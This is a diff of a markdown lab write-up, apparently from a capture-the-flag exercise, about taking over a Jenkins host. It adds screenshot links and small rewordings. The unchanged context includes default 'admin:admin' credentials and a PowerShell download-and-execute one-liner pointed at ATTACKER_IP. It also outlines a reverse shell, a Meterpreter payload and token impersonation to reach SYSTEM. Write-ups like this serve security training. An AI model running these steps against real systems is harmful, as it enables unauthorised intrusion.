@@ -26,7 +26,7 @@ admin:admin
 ```
 
 This confirmed an administrative foothold on the Jenkins service.
-
+![Jenkins dashboard accessed](screenshots/jenkinsdashboard.png)
 ---
 
 ## Initial Access
@@ -43,28 +43,37 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:ATT
 
 A Netcat listener was started on the attacker machine, resulting in a successful reverse shell connection.
 
+![Initial reverse shell obtained](screenshots/shell.png)
 ---
 
 ## Privilege Escalation
 
-Post‑exploitation enumeration revealed that the compromised user had powerful Windows privileges enabled. Running the following command:
+Post‑exploitation enumeration revealed that the compromised user had several powerful Windows privileges enabled. Running the following command:
 
 ```powershell
 whoami /priv
 ```
 
 showed that both `SeDebugPrivilege` and `SeImpersonatePrivilege` were available.
-
-Because token impersonation is more reliably exploited using Meterpreter, the shell was upgraded.
+To reliably exploit these privileges, the initial shell was upgraded to a Meterpreter session.
 
 A Meterpreter payload was generated using **msfvenom**, transferred to the target system, and executed. A Metasploit listener was configured to receive the session.
 
+![Meterpreter session gained](screenshots/meterpreter.png)
+
 Once the Meterpreter session was established, the **incognito** module was loaded to enumerate and impersonate available tokens.
+
+![Impersonated priv](screenshots/impersonated.png)
 
 An administrative token was successfully impersonated. However, impersonating a token alone does not guarantee full SYSTEM privileges. To fully escalate, the session was migrated into a process running under `NT AUTHORITY\SYSTEM`.
 
+> Used this service shown in the screenshot below 
+
+![Service used](screenshots/service.png)
+
 After migrating to a SYSTEM‑level process, full administrative access to the machine was achieved.
 
+![SYSTEM privileges obtained](screenshots/privilege.png)
 ---
 
 ## Conclusion & Key Takeaways
